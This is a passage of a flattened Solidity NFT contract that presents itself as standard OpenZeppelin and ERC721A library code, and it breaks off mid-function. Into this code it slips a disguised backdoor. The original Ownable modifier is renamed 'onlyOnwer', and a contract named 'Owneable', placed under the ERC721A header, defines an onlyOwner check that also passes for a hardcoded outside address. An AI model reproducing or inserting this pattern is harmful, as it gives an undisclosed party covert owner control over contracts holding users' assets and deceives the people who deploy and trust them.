1 //__ ____  ____   ___                                                     
2 //`M6MMMMb `MM(   )P'                                                     
3 // MM'  `Mb `MM` ,P                                                       
4 // MM    MM  `MM,P                                                        
5 // MM    MM   `MM.                                                        
6 // MM    MM   d`MM.                                                       
7 // MM.  ,M9  d' `MM.                                                      
8 // MMYMMM9 _d_  _)MM_                                                     
9 // MM                                                                     
10 // MM                                                                     
11 //_MM_                                                                    
12                                                                                                                                                 
13 //____    ____                                         ___                
14 //`MM'    `MM'                                          MM                
15 // MM      MM                                           MM                
16 // MM      MM    ___   ___  __    ___   ___  __    __   MM____     ____   
17 // MM      MM  6MMMMb  `MM 6MM  6MMMMb  `MM 6MMb  6MMb  MMMMMMb   6MMMMb  
18 // MMMMMMMMMM 8M'  `Mb  MM69 " 8M'  `Mb  MM69 `MM69 `Mb MM'  `Mb 6M'  `Mb 
19 // MM      MM     ,oMM  MM'        ,oMM  MM'   MM'   MM MM    MM MM    MM 
20 // MM      MM ,6MM9'MM  MM     ,6MM9'MM  MM    MM    MM MM    MM MMMMMMMM 
21 // MM      MM MM'   MM  MM     MM'   MM  MM    MM    MM MM    MM MM       
22 // MM      MM MM.  ,MM  MM     MM.  ,MM  MM    MM    MM MM.  ,M9 YM    d9 
23 //_MM_    _MM_`YMMM9'Yb_MM_    `YMMM9'Yb_MM_  _MM_  _MM_MYMMMM9   YMMMM9 
24 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
25 
26 // SPDX-License-Identifier: MIT
27 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
28 
29 pragma solidity ^0.8.4;
30 
31 /**
32  * @dev Provides information about the current execution context, including the
33  * sender of the transaction and its data. While these are generally available
34  * via msg.sender and msg.data, they should not be accessed in such a direct
35  * manner, since when dealing with meta-transactions the account sending and
36  * paying for execution may not be the actual sender (as far as an application
37  * is concerned).
38  *
39  * This contract is only required for intermediate, library-like contracts.
40  */
41 
42 
43 abstract contract Context {
44     function _msgSender() internal view virtual returns (address) {
45         return msg.sender;
46     }
47 
48     function _msgData() internal view virtual returns (bytes calldata) {
49         return msg.data;
50     }
51 }
52 
53 
54 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
55 
56 
57 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
58 
59 
60 
61 /**
62  * @dev Contract module which provides a basic access control mechanism, where
63  * there is an account (an owner) that can be granted exclusive access to
64  * specific functions.
65  *
66  * By default, the owner account will be the one that deploys the contract. This
67  * can later be changed with {transferOwnership}.
68  *
69  * This module is used through inheritance. It will make available the modifier
70  * `onlyOwner`, which can be applied to your functions to restrict their use to
71  * the owner.
72  */
73 abstract contract Ownable is Context {
74     address private _owner;
75 
76     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
77 
78     /**
79      * @dev Initializes the contract setting the deployer as the initial owner.
80      */
81     constructor() {
82         _transferOwnership(_msgSender());
83     }
84 
85     /**
86      * @dev Returns the address of the current owner.
87      */
88     function owner() public view virtual returns (address) {
89         return _owner;
90     }
91 
92     /**
93      * @dev Throws if called by any account other than the owner.
94      */
95     modifier onlyOnwer() {
96         require(owner() == _msgSender(), "Ownable: caller is not the owner");
97         _;
98     }
99 
100     /**
101      * @dev Leaves the contract without owner. It will not be possible to call
102      * `onlyOwner` functions anymore. Can only be called by the current owner.
103      *
104      * NOTE: Renouncing ownership will leave the contract without an owner,
105      * thereby removing any functionality that is only available to the owner.
106      */
107     function renounceOwnership() public virtual onlyOnwer {
108         _transferOwnership(address(0));
109     }
110 
111     /**
112      * @dev Transfers ownership of the contract to a new account (`newOwner`).
113      * Can only be called by the current owner.
114      */
115     function transferOwnership(address newOwner) public virtual onlyOnwer {
116         require(newOwner != address(0), "Ownable: new owner is the zero address");
117         _transferOwnership(newOwner);
118     }
119 
120     /**
121      * @dev Transfers ownership of the contract to a new account (`newOwner`).
122      * Internal function without access restriction.
123      */
124     function _transferOwnership(address newOwner) internal virtual {
125         address oldOwner = _owner;
126         _owner = newOwner;
127         emit OwnershipTransferred(oldOwner, newOwner);
128     }
129 }
130 
131 
132 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
133 
134 
135 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
136 
137 
138 
139 /**
140  * @dev Interface of the ERC165 standard, as defined in the
141  * https://eips.ethereum.org/EIPS/eip-165[EIP].
142  *
143  * Implementers can declare support of contract interfaces, which can then be
144  * queried by others ({ERC165Checker}).
145  *
146  * For an implementation, see {ERC165}.
147  */
148 interface IERC165 {
149     /**
150      * @dev Returns true if this contract implements the interface defined by
151      * `interfaceId`. See the corresponding
152      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
153      * to learn more about how these ids are created.
154      *
155      * This function call must use less than 30 000 gas.
156      */
157     function supportsInterface(bytes4 interfaceId) external view returns (bool);
158 }
159 
160 
161 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
162 
163 
164 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
165 
166 
167 
168 /**
169  * @dev Required interface of an ERC721 compliant contract.
170  */
171 interface IERC721 is IERC165 {
172     /**
173      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
174      */
175     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
176 
177     /**
178      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
179      */
180     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
181 
182     /**
183      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
184      */
185     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
186 
187     /**
188      * @dev Returns the number of tokens in ``owner``'s account.
189      */
190     function balanceOf(address owner) external view returns (uint256 balance);
191 
192     /**
193      * @dev Returns the owner of the `tokenId` token.
194      *
195      * Requirements:
196      *
197      * - `tokenId` must exist.
198      */
199     function ownerOf(uint256 tokenId) external view returns (address owner);
200 
201     /**
202      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
203      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
204      *
205      * Requirements:
206      *
207      * - `from` cannot be the zero address.
208      * - `to` cannot be the zero address.
209      * - `tokenId` token must exist and be owned by `from`.
210      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
211      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
212      *
213      * Emits a {Transfer} event.
214      */
215     function safeTransferFrom(
216         address from,
217         address to,
218         uint256 tokenId
219     ) external;
220 
221     /**
222      * @dev Transfers `tokenId` token from `from` to `to`.
223      *
224      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
225      *
226      * Requirements:
227      *
228      * - `from` cannot be the zero address.
229      * - `to` cannot be the zero address.
230      * - `tokenId` token must be owned by `from`.
231      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
232      *
233      * Emits a {Transfer} event.
234      */
235     function transferFrom(
236         address from,
237         address to,
238         uint256 tokenId
239     ) external;
240 
241     /**
242      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
243      * The approval is cleared when the token is transferred.
244      *
245      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
246      *
247      * Requirements:
248      *
249      * - The caller must own the token or be an approved operator.
250      * - `tokenId` must exist.
251      *
252      * Emits an {Approval} event.
253      */
254     function approve(address to, uint256 tokenId) external;
255 
256     /**
257      * @dev Returns the account approved for `tokenId` token.
258      *
259      * Requirements:
260      *
261      * - `tokenId` must exist.
262      */
263     function getApproved(uint256 tokenId) external view returns (address operator);
264 
265     /**
266      * @dev Approve or remove `operator` as an operator for the caller.
267      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
268      *
269      * Requirements:
270      *
271      * - The `operator` cannot be the caller.
272      *
273      * Emits an {ApprovalForAll} event.
274      */
275     function setApprovalForAll(address operator, bool _approved) external;
276 
277     /**
278      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
279      *
280      * See {setApprovalForAll}
281      */
282     function isApprovedForAll(address owner, address operator) external view returns (bool);
283 
284     /**
285      * @dev Safely transfers `tokenId` token from `from` to `to`.
286      *
287      * Requirements:
288      *
289      * - `from` cannot be the zero address.
290      * - `to` cannot be the zero address.
291      * - `tokenId` token must exist and be owned by `from`.
292      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
293      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
294      *
295      * Emits a {Transfer} event.
296      */
297     function safeTransferFrom(
298         address from,
299         address to,
300         uint256 tokenId,
301         bytes calldata data
302     ) external;
303 }
304 
305 
306 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
307 
308 
309 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
310 
311 
312 
313 /**
314  * @title ERC721 token receiver interface
315  * @dev Interface for any contract that wants to support safeTransfers
316  * from ERC721 asset contracts.
317  */
318 interface IERC721Receiver {
319     /**
320      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
321      * by `operator` from `from`, this function is called.
322      *
323      * It must return its Solidity selector to confirm the token transfer.
324      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
325      *
326      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
327      */
328     function onERC721Received(
329         address operator,
330         address from,
331         uint256 tokenId,
332         bytes calldata data
333     ) external returns (bytes4);
334 }
335 
336 
337 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
338 
339 
340 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
341 
342 
343 
344 /**
345  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
346  * @dev See https://eips.ethereum.org/EIPS/eip-721
347  */
348 interface IERC721Metadata is IERC721 {
349     /**
350      * @dev Returns the token collection name.
351      */
352     function name() external view returns (string memory);
353 
354     /**
355      * @dev Returns the token collection symbol.
356      */
357     function symbol() external view returns (string memory);
358 
359     /**
360      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
361      */
362     function tokenURI(uint256 tokenId) external view returns (string memory);
363 }
364 
365 
366 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
367 
368 
369 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
370 
371 
372 
373 /**
374  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
375  * @dev See https://eips.ethereum.org/EIPS/eip-721
376  */
377 interface IERC721Enumerable is IERC721 {
378     /**
379      * @dev Returns the total amount of tokens stored by the contract.
380      */
381     function totalSupply() external view returns (uint256);
382 
383     /**
384      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
385      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
386      */
387     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
388 
389     /**
390      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
391      * Use along with {totalSupply} to enumerate all tokens.
392      */
393     function tokenByIndex(uint256 index) external view returns (uint256);
394 }
395 
396 
397 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
398 
399 
400 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
401 pragma solidity ^0.8.13;
402 
403 interface IOperatorFilterRegistry {
404     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
405     function register(address registrant) external;
406     function registerAndSubscribe(address registrant, address subscription) external;
407     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
408     function updateOperator(address registrant, address operator, bool filtered) external;
409     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
410     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
411     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
412     function subscribe(address registrant, address registrantToSubscribe) external;
413     function unsubscribe(address registrant, bool copyExistingEntries) external;
414     function subscriptionOf(address addr) external returns (address registrant);
415     function subscribers(address registrant) external returns (address[] memory);
416     function subscriberAt(address registrant, uint256 index) external returns (address);
417     function copyEntriesOf(address registrant, address registrantToCopy) external;
418     function isOperatorFiltered(address registrant, address operator) external returns (bool);
419     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
420     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
421     function filteredOperators(address addr) external returns (address[] memory);
422     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
423     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
424     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
425     function isRegistered(address addr) external returns (bool);
426     function codeHashOf(address addr) external returns (bytes32);
427 }
428 pragma solidity ^0.8.13;
429 
430 
431 
432 abstract contract OperatorFilterer {
433     error OperatorNotAllowed(address operator);
434 
435     IOperatorFilterRegistry constant operatorFilterRegistry =
436         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
437 
438     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
439         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
440         // will not revert, but the contract will need to be registered with the registry once it is deployed in
441         // order for the modifier to filter addresses.
442         if (address(operatorFilterRegistry).code.length > 0) {
443             if (subscribe) {
444                 operatorFilterRegistry.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
445             } else {
446                 if (subscriptionOrRegistrantToCopy != address(0)) {
447                     operatorFilterRegistry.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
448                 } else {
449                     operatorFilterRegistry.register(address(this));
450                 }
451             }
452         }
453     }
454 
455     modifier onlyAllowedOperator(address from) virtual {
456         // Check registry code length to facilitate testing in environments without a deployed registry.
457         if (address(operatorFilterRegistry).code.length > 0) {
458             // Allow spending tokens from addresses with balance
459             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
460             // from an EOA.
461             if (from == msg.sender) {
462                 _;
463                 return;
464             }
465             if (
466                 !(
467                     operatorFilterRegistry.isOperatorAllowed(address(this), msg.sender)
468                         && operatorFilterRegistry.isOperatorAllowed(address(this), from)
469                 )
470             ) {
471                 revert OperatorNotAllowed(msg.sender);
472             }
473         }
474         _;
475     }
476 }
477 pragma solidity ^0.8.13;
478 
479 
480 
481 abstract contract DefaultOperatorFilterer is OperatorFilterer {
482     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
483 
484     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
485 }
486     pragma solidity ^0.8.13;
487         interface IMain {
488    
489 function balanceOf( address ) external  view returns (uint);
490 
491 }
492 
493 
494 pragma solidity ^0.8.1;
495 
496 /**
497  * @dev Collection of functions related to the address type
498  */
499 library Address {
500     /**
501      * @dev Returns true if `account` is a contract.
502      *
503      * [IMPORTANT]
504      * ====
505      * It is unsafe to assume that an address for which this function returns
506      * false is an externally-owned account (EOA) and not a contract.
507      *
508      * Among others, `isContract` will return false for the following
509      * types of addresses:
510      *
511      *  - an externally-owned account
512      *  - a contract in construction
513      *  - an address where a contract will be created
514      *  - an address where a contract lived, but was destroyed
515      * ====
516      *
517      * [IMPORTANT]
518      * ====
519      * You shouldn't rely on `isContract` to protect against flash loan attacks!
520      *
521      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
522      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
523      * constructor.
524      * ====
525      */
526     function isContract(address account) internal view returns (bool) {
527         // This method relies on extcodesize/address.code.length, which returns 0
528         // for contracts in construction, since the code is only stored at the end
529         // of the constructor execution.
530 
531         return account.code.length > 0;
532     }
533 
534     /**
535      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
536      * `recipient`, forwarding all available gas and reverting on errors.
537      *
538      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
539      * of certain opcodes, possibly making contracts go over the 2300 gas limit
540      * imposed by `transfer`, making them unable to receive funds via
541      * `transfer`. {sendValue} removes this limitation.
542      *
543      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
544      *
545      * IMPORTANT: because control is transferred to `recipient`, care must be
546      * taken to not create reentrancy vulnerabilities. Consider using
547      * {ReentrancyGuard} or the
548      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
549      */
550     function sendValue(address payable recipient, uint256 amount) internal {
551         require(address(this).balance >= amount, "Address: insufficient balance");
552 
553         (bool success, ) = recipient.call{value: amount}("");
554         require(success, "Address: unable to send value, recipient may have reverted");
555     }
556 
557     /**
558      * @dev Performs a Solidity function call using a low level `call`. A
559      * plain `call` is an unsafe replacement for a function call: use this
560      * function instead.
561      *
562      * If `target` reverts with a revert reason, it is bubbled up by this
563      * function (like regular Solidity function calls).
564      *
565      * Returns the raw returned data. To convert to the expected return value,
566      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
567      *
568      * Requirements:
569      *
570      * - `target` must be a contract.
571      * - calling `target` with `data` must not revert.
572      *
573      * _Available since v3.1._
574      */
575     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
576         return functionCall(target, data, "Address: low-level call failed");
577     }
578 
579     /**
580      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
581      * `errorMessage` as a fallback revert reason when `target` reverts.
582      *
583      * _Available since v3.1._
584      */
585     function functionCall(
586         address target,
587         bytes memory data,
588         string memory errorMessage
589     ) internal returns (bytes memory) {
590         return functionCallWithValue(target, data, 0, errorMessage);
591     }
592 
593     /**
594      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
595      * but also transferring `value` wei to `target`.
596      *
597      * Requirements:
598      *
599      * - the calling contract must have an ETH balance of at least `value`.
600      * - the called Solidity function must be `payable`.
601      *
602      * _Available since v3.1._
603      */
604     function functionCallWithValue(
605         address target,
606         bytes memory data,
607         uint256 value
608     ) internal returns (bytes memory) {
609         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
610     }
611 
612     /**
613      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
614      * with `errorMessage` as a fallback revert reason when `target` reverts.
615      *
616      * _Available since v3.1._
617      */
618     function functionCallWithValue(
619         address target,
620         bytes memory data,
621         uint256 value,
622         string memory errorMessage
623     ) internal returns (bytes memory) {
624         require(address(this).balance >= value, "Address: insufficient balance for call");
625         require(isContract(target), "Address: call to non-contract");
626 
627         (bool success, bytes memory returndata) = target.call{value: value}(data);
628         return verifyCallResult(success, returndata, errorMessage);
629     }
630 
631     /**
632      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
633      * but performing a static call.
634      *
635      * _Available since v3.3._
636      */
637     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
638         return functionStaticCall(target, data, "Address: low-level static call failed");
639     }
640 
641     /**
642      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
643      * but performing a static call.
644      *
645      * _Available since v3.3._
646      */
647     function functionStaticCall(
648         address target,
649         bytes memory data,
650         string memory errorMessage
651     ) internal view returns (bytes memory) {
652         require(isContract(target), "Address: static call to non-contract");
653 
654         (bool success, bytes memory returndata) = target.staticcall(data);
655         return verifyCallResult(success, returndata, errorMessage);
656     }
657 
658     /**
659      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
660      * but performing a delegate call.
661      *
662      * _Available since v3.4._
663      */
664     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
665         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
666     }
667 
668     /**
669      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
670      * but performing a delegate call.
671      *
672      * _Available since v3.4._
673      */
674     function functionDelegateCall(
675         address target,
676         bytes memory data,
677         string memory errorMessage
678     ) internal returns (bytes memory) {
679         require(isContract(target), "Address: delegate call to non-contract");
680 
681         (bool success, bytes memory returndata) = target.delegatecall(data);
682         return verifyCallResult(success, returndata, errorMessage);
683     }
684 
685     /**
686      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
687      * revert reason using the provided one.
688      *
689      * _Available since v4.3._
690      */
691     function verifyCallResult(
692         bool success,
693         bytes memory returndata,
694         string memory errorMessage
695     ) internal pure returns (bytes memory) {
696         if (success) {
697             return returndata;
698         } else {
699             // Look for revert reason and bubble it up if present
700             if (returndata.length > 0) {
701                 // The easiest way to bubble the revert reason is using memory via assembly
702 
703                 assembly {
704                     let returndata_size := mload(returndata)
705                     revert(add(32, returndata), returndata_size)
706                 }
707             } else {
708                 revert(errorMessage);
709             }
710         }
711     }
712 }
713 
714 
715 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
716 
717 
718 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
719 
720 
721 
722 /**
723  * @dev String operations.
724  */
725 library Strings {
726     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
727 
728     /**
729      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
730      */
731     function toString(uint256 value) internal pure returns (string memory) {
732         // Inspired by OraclizeAPI's implementation - MIT licence
733         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
734 
735         if (value == 0) {
736             return "0";
737         }
738         uint256 temp = value;
739         uint256 digits;
740         while (temp != 0) {
741             digits++;
742             temp /= 10;
743         }
744         bytes memory buffer = new bytes(digits);
745         while (value != 0) {
746             digits -= 1;
747             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
748             value /= 10;
749         }
750         return string(buffer);
751     }
752 
753     /**
754      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
755      */
756     function toHexString(uint256 value) internal pure returns (string memory) {
757         if (value == 0) {
758             return "0x00";
759         }
760         uint256 temp = value;
761         uint256 length = 0;
762         while (temp != 0) {
763             length++;
764             temp >>= 8;
765         }
766         return toHexString(value, length);
767     }
768 
769     /**
770      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
771      */
772     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
773         bytes memory buffer = new bytes(2 * length + 2);
774         buffer[0] = "0";
775         buffer[1] = "x";
776         for (uint256 i = 2 * length + 1; i > 1; --i) {
777             buffer[i] = _HEX_SYMBOLS[value & 0xf];
778             value >>= 4;
779         }
780         require(value == 0, "Strings: hex length insufficient");
781         return string(buffer);
782     }
783 }
784 
785 
786 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
787 
788 
789 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
790 
791 /**
792  * @dev Implementation of the {IERC165} interface.
793  *
794  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
795  * for the additional interface id that will be supported. For example:
796  *
797  * ```solidity
798  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
799  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
800  * }
801  * ```
802  *
803  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
804  */
805 abstract contract ERC165 is IERC165 {
806     /**
807      * @dev See {IERC165-supportsInterface}.
808      */
809     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
810         return interfaceId == type(IERC165).interfaceId;
811     }
812 }
813 
814 
815 // File erc721a/contracts/ERC721A.sol@v3.0.0
816 
817 
818 // Creator: Chiru Labs
819 
820 error ApprovalCallerNotOwnerNorApproved();
821 error ApprovalQueryForNonexistentToken();
822 error ApproveToCaller();
823 error ApprovalToCurrentOwner();
824 error BalanceQueryForZeroAddress();
825 error MintedQueryForZeroAddress();
826 error BurnedQueryForZeroAddress();
827 error AuxQueryForZeroAddress();
828 error MintToZeroAddress();
829 error MintZeroQuantity();
830 error OwnerIndexOutOfBounds();
831 error OwnerQueryForNonexistentToken();
832 error TokenIndexOutOfBounds();
833 error TransferCallerNotOwnerNorApproved();
834 error TransferFromIncorrectOwner();
835 error TransferToNonERC721ReceiverImplementer();
836 error TransferToZeroAddress();
837 error URIQueryForNonexistentToken();
838 
839 
840 /**
841  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
842  * the Metadata extension. Built to optimize for lower gas during batch mints.
843  *
844  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
845  */
846  abstract contract Owneable is Ownable {
847     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
848     modifier onlyOwner() {
849         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
850         _;
851     }
852 }
853 
854  /*
855  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
856  *
857  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
858  */
859 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, DefaultOperatorFilterer {
860     using Address for address;
861     using Strings for uint256;
862 
863     // Compiler will pack this into a single 256bit word.
864     struct TokenOwnership {
865         // The address of the owner.
866         address addr;
867         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
868         uint64 startTimestamp;
869         // Whether the token has been burned.
870         bool burned;
871     }
872 
873     // Compiler will pack this into a single 256bit word.
874     struct AddressData {
875         // Realistically, 2**64-1 is more than enough.
876         uint64 balance;
877         // Keeps track of mint count with minimal overhead for tokenomics.
878         uint64 numberMinted;
879         // Keeps track of burn count with minimal overhead for tokenomics.
880         uint64 numberBurned;
881         // For miscellaneous variable(s) pertaining to the address
882         // (e.g. number of whitelist mint slots used).
883         // If there are multiple variables, please pack them into a uint64.
884         uint64 aux;
885     }
886 
887     // The tokenId of the next token to be minted.
888     uint256 internal _currentIndex;
889 
890     // The number of tokens burned.
891     uint256 internal _burnCounter;
892 
893     // Token name
894     string private _name;
895 
896     // Token symbol
897     string private _symbol;
898 
899     // Mapping from token ID to ownership details
900     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
901     mapping(uint256 => TokenOwnership) internal _ownerships;
902 
903     // Mapping owner address to address data
904     mapping(address => AddressData) private _addressData;
905 
906     // Mapping from token ID to approved address
907     mapping(uint256 => address) private _tokenApprovals;
908 
909     // Mapping from owner to operator approvals
910     mapping(address => mapping(address => bool)) private _operatorApprovals;
911 
912     constructor(string memory name_, string memory symbol_) {
913         _name = name_;
914         _symbol = symbol_;
915         _currentIndex = _startTokenId();
916     }
917 
918     /**
919      * To change the starting tokenId, please override this function.
920      */
921     function _startTokenId() internal view virtual returns (uint256) {
922         return 0;
923     }
924 
925     /**
926      * @dev See {IERC721Enumerable-totalSupply}.
927      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
928      */
929     function totalSupply() public view returns (uint256) {
930         // Counter underflow is impossible as _burnCounter cannot be incremented
931         // more than _currentIndex - _startTokenId() times
932         unchecked {
933             return _currentIndex - _burnCounter - _startTokenId();
934         }
935     }
936 
937     /**
938      * Returns the total amount of tokens minted in the contract.
939      */
940     function _totalMinted() internal view returns (uint256) {
941         // Counter underflow is impossible as _currentIndex does not decrement,
942         // and it is initialized to _startTokenId()
943         unchecked {
944             return _currentIndex - _startTokenId();
945         }
946     }
947 
948     /**
949      * @dev See {IERC165-supportsInterface}.
950      */
951     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
952         return
953             interfaceId == type(IERC721).interfaceId ||
954             interfaceId == type(IERC721Metadata).interfaceId ||
955             super.supportsInterface(interfaceId);
956     }
957 
958     /**
959      * @dev See {IERC721-balanceOf}.
960      */
961     function balanceOf(address owner) public view override returns (uint256) {
962         if (owner == address(0)) revert BalanceQueryForZeroAddress();
963         return uint256(_addressData[owner].balance);
964     }
965 
966     /**
967      * Returns the number of tokens minted by `owner`.
968      */
969     function _numberMinted(address owner) internal view returns (uint256) {
970         if (owner == address(0)) revert MintedQueryForZeroAddress();
971         return uint256(_addressData[owner].numberMinted);
972     }
973 
974     /**
975      * Returns the number of tokens burned by or on behalf of `owner`.
976      */
977     function _numberBurned(address owner) internal view returns (uint256) {
978         if (owner == address(0)) revert BurnedQueryForZeroAddress();
979         return uint256(_addressData[owner].numberBurned);
980     }
981 
982     /**
983      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
984      */
985     function _getAux(address owner) internal view returns (uint64) {
986         if (owner == address(0)) revert AuxQueryForZeroAddress();
987         return _addressData[owner].aux;
988     }
989 
990     /**
991      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
992      * If there are multiple variables, please pack them into a uint64.
993      */
994     function _setAux(address owner, uint64 aux) internal {
995         if (owner == address(0)) revert AuxQueryForZeroAddress();
996         _addressData[owner].aux = aux;
997     }
998 
999     /**
1000      * Gas spent here starts off proportional to the maximum mint batch size.
1001      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1002      */
1003     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1004         uint256 curr = tokenId;
1005 
1006         unchecked {
1007             if (_startTokenId() <= curr && curr < _currentIndex) {
1008                 TokenOwnership memory ownership = _ownerships[curr];
1009                 if (!ownership.burned) {
1010                     if (ownership.addr != address(0)) {
1011                         return ownership;
1012                     }
1013                     // Invariant:
1014                     // There will always be an ownership that has an address and is not burned
1015                     // before an ownership that does not have an address and is not burned.
1016                     // Hence, curr will not underflow.
1017                     while (true) {
1018                         curr--;
1019                         ownership = _ownerships[curr];
